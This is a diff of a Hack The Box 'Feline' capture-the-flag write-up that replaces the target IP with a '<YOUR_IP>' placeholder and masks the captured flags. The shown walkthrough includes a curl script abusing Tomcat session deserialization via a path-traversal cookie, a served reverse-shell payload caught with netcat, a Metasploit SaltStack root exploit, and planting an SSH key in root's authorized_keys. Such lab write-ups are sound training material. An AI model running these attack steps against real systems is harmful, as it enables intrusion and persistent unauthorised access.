@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Feline
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-feline-infocard.png)
-
 Short description to include any strange things to be dealt with - Hard Linux
 
 ## Useful Skills and Tools
@@ -29,11 +27,11 @@ Short description to include any strange things to be dealt with - Hard Linux
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.205`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
-└─$ nmap -sCV -n -p- -v 10.10.10.205 -oA feline    
+└─$ nmap -sCV -n -p- -v <YOUR_IP> -oA feline    
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 11:49 EST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -44,24 +42,24 @@ Completed NSE at 11:49, 0.00s elapsed
 Initiating NSE at 11:49
 Completed NSE at 11:49, 0.00s elapsed
 Initiating Ping Scan at 11:49
-Scanning 10.10.10.205 [2 ports]
+Scanning <YOUR_IP> [2 ports]
 Completed Ping Scan at 11:49, 0.07s elapsed (1 total hosts)
 Initiating Connect Scan at 11:49
-Scanning 10.10.10.205 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.205
-Discovered open port 8080/tcp on 10.10.10.205
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 22/tcp on <YOUR_IP>
+Discovered open port 8080/tcp on <YOUR_IP>
 Completed Connect Scan at 11:49, 21.39s elapsed (65535 total ports)
 Initiating Service scan at 11:49
-Scanning 2 services on 10.10.10.205
+Scanning 2 services on <YOUR_IP>
 Completed Service scan at 11:49, 6.49s elapsed (2 services on 1 host)
-NSE: Script scanning 10.10.10.205.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 11:49
 Completed NSE at 11:49, 1.38s elapsed
 Initiating NSE at 11:49
 Completed NSE at 11:49, 0.18s elapsed
 Initiating NSE at 11:49
 Completed NSE at 11:49, 0.01s elapsed
-Nmap scan report for 10.10.10.205
+Nmap scan report for <YOUR_IP>
 Host is up (0.067s latency).
 Not shown: 65533 closed ports
 PORT     STATE SERVICE VERSION
@@ -257,14 +255,14 @@ The final malicious session file was used to execute my payload.sh reverse shell
 ```bash
 #!/bin/bash
 # exploit.sh
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/downloadPayload' -F 'image=@downloadPayload.session'
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/downloadPayload'
+curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/downloadPayload' -F 'image=@downloadPayload.session'
+curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/downloadPayload'
 sleep 1
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/chmodPayload' -F 'image=@chmodPayload.session'
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/chmodPayload'
+curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/chmodPayload' -F 'image=@chmodPayload.session'
+curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/chmodPayload'
 sleep 1
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload' -F 'image=@executePayload.session'
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload'
+curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload' -F 'image=@executePayload.session'
+curl http://<YOUR_IP>:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload'
 ```
 
 Finally I wrote a script to automate uploading all of these files to the server. Next I ran `python3 -m http.server` so that the final payload could be downloaded, started a netcat listener, and then I ran the script and hoped that everything would work!
@@ -275,20 +273,17 @@ Finally I wrote a script to automate uploading all of these files to the server.
 
 File uploaded successfully!
 
-
 <!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 – Internal Server Error</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> InvokerTransformer: The method &#39;newTransformer&#39; on &#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39; threw an exception</p><p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p><p><b>Exception</b></p><pre>org.apache.commons.collections4.FunctorException: InvokerTransformer: The method &#39;newTransformer&#39; on &#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39; threw an exception
        ...snipped verbose error messages...
 </pre><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/9.0.27</h3></body></html>
 
 File uploaded successfully!
 
-
 <!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 – Internal Server Error</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> InvokerTransformer: The method &#39;newTransformer&#39; on &#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39; threw an exception</p><p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p><p><b>Exception</b></p><pre>org.apache.commons.collections4.FunctorException: InvokerTransformer: The method &#39;newTransformer&#39; on &#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39; threw an exception
         ...snipped verbose error messages...
 </pre><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/9.0.27</h3></body></html>
 
 File uploaded successfully!
-
 
 <!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 – Internal Server Error</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> InvokerTransformer: The method &#39;newTransformer&#39; on &#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39; threw an exception</p><p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p><p><b>Exception</b></p><pre>org.apache.commons.collections4.FunctorException: InvokerTransformer: The method &#39;newTransformer&#39; on &#39;class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39; threw an exception
        ...snipped verbose error messages...
@@ -303,7 +298,7 @@ Each of the files were uploaded successfully, though they each threw a `HTTP Sta
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ python3 -m http.server 9990
 Serving HTTP on 0.0.0.0 port 9990 (http://0.0.0.0:9990/) ...
-10.10.10.205 - - [13/Dec/2020 15:51:44] "GET /payload.sh HTTP/1.1" 200 -
+<YOUR_IP> - - [13/Dec/2020 15:51:44] "GET /payload.sh HTTP/1.1" 200 -
 ```
 
 Got a connection to my http.server, sending my payload on its way
@@ -317,7 +312,7 @@ Script started, output log file is 'typescript'.
 └─$ bash                                                                                            1 ⨯
 zweilos@kali:~/htb/feline$ nc -lvnp 8991
 listening on [any] 8991 ...
-connect to [10.10.15.98] from (UNKNOWN) [10.10.10.205] 43900
+connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 43900
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 tomcat@VirusBucket:/opt/tomcat$ ^Z
 [1]+  Stopped                 nc -lvnp 8991
@@ -340,14 +335,14 @@ tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
 tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      -                   
 tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      -                   
 tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
-tcp        0      1 10.10.10.205:44894      1.1.1.1:53              SYN_SENT    -                   
-tcp        0    511 10.10.10.205:43900      10.10.15.98:8991        ESTABLISHED 15461/bash          
-tcp        0      0 10.10.10.205:34440      10.10.15.98:8990        CLOSE_WAIT  15048/bash          
+tcp        0      1 <YOUR_IP>:44894      1.1.1.1:53              SYN_SENT    -                   
+tcp        0    511 <YOUR_IP>:43900      10.10.15.98:8991        ESTABLISHED 15461/bash          
+tcp        0      0 <YOUR_IP>:34440      10.10.15.98:8990        CLOSE_WAIT  15048/bash          
 tcp6       0      0 :::22                   :::*                    LISTEN      -                   
 tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      968/java            
 tcp6       0      0 :::8080                 :::*                    LISTEN      968/java            
 udp        0      0 127.0.0.1:46744         127.0.0.53:53           ESTABLISHED -                   
-udp        0      0 10.10.10.205:59415      1.0.0.1:53              ESTABLISHED -                   
+udp        0      0 <YOUR_IP>:59415      1.0.0.1:53              ESTABLISHED -                   
 udp        0      0 127.0.0.53:53           0.0.0.0:*
 ```
 
@@ -363,7 +358,7 @@ tomcat@VirusBucket:/dev/shm$ ip a
        valid_lft forever preferred_lft forever
 2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:50:56:b9:2c:51 brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.205/24 brd 10.10.10.255 scope global ens160
+    inet <YOUR_IP>/24 brd <YOUR_IP> scope global ens160
        valid_lft forever preferred_lft forever
     inet6 dead:beef::250:56ff:feb9:2c51/64 scope global dynamic mngtmpaddr 
        valid_lft 86146sec preferred_lft 14146sec
@@ -392,7 +387,7 @@ There was a docker container hosted
 ```text
 tomcat@VirusBucket:/dev/shm$ cd ~
 tomcat@VirusBucket:~$ cat user.txt 
-a26df84070ff88060d77f79a027bed37
+****
 tomcat@VirusBucket:~$ ls -la
 total 24
 drwxr-xr-x 2 root   root   4096 Jun 17 05:14 .
@@ -403,7 +398,7 @@ lrwxrwxrwx 1 root   root      9 Jun 17 05:14 .bash_history -> /dev/null
 -rw-r--r-- 1 tomcat tomcat  807 Feb 25  2020 .profile
 -rw-r--r-- 1 root   root     33 Dec 13 16:52 user.txt
 tomcat@VirusBucket:~$ cat user.txt 
-a26df84070ff88060d77f79a027bed37
+****
 ```
 
 The user `tomcat` ended up being the user with the `user.txt` flag!
@@ -557,7 +552,7 @@ msf6 exploit(linux/http/saltstack_salt_api_cmd_exec) > run
 [*] Executing automatic check (disable AutoCheck to override)
 [+] The target is vulnerable. Auth bypass successful.
 [*] Executing Unix Command for cmd/unix/reverse_python_ssl
-[*] Command shell session 1 opened (10.10.15.98:9967 -> 10.10.10.205:54552) at 2020-12-13 17:29:05 -0500
+[*] Command shell session 1 opened (10.10.15.98:9967 -> <YOUR_IP>:54552) at 2020-12-13 17:29:05 -0500
 
 whoami
 root
@@ -827,7 +822,7 @@ drwx------    2 root     root          4096 Jun 30 09:10 .ssh
 drwxr-xr-x    3 root     root          4096 May 18  2020 snap
 /tmp # ^[[28;8Rcat root.txt
 cat root.txt
-cadbc87f7fbe8bff317c9db5063c9e63
+****
 /tmp # ^[[28;8Recho 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8emG+VqFZL/N0w=' >> .ssh/authorized_keys
 echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTY
 AAABBBALitdwPZ4cTmWVPyzqI7w1UMtDj2y4uYZBCCdc2yi+tHz8y1VkLLWWH9ohWsGQEOT1L9t/Zc8e
@@ -840,7 +835,7 @@ I changed directories to `/tmp` in the container, which now mirrored `/root` on 
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
-└─$ ssh root@10.10.10.205 -i tomcat.key                  
+└─$ ssh root@<YOUR_IP> -i tomcat.key                  
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -857,7 +852,7 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
   Users logged in:                  0
   IPv4 address for br-e9220f64857c: 172.18.0.1
   IPv4 address for docker0:         172.17.0.1
-  IPv4 address for ens160:          10.10.10.205
+  IPv4 address for ens160:          <YOUR_IP>
   IPv6 address for ens160:          dead:beef::250:56ff:feb9:2c51
 
  * Are you ready for Kubernetes 1.19? It's nearly here! Try RC3 with
@@ -869,7 +864,6 @@ Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 0 of these updates are security updates.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
@@ -880,13 +874,9 @@ VirusBucket
 root@VirusBucket:~# ls
 root.txt  snap
 root@VirusBucket:~# cat root.txt
-cadbc87f7fbe8bff317c9db5063c9e63
+****
 ```
 
 I was in, and got my root proof!
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-feline-pwned.png)
-
-Thanks to [MinatoTW](https://www.hackthebox.eu/home/users/profile/8308) & [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531) for... \[something interesting or useful about this machine.\]
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
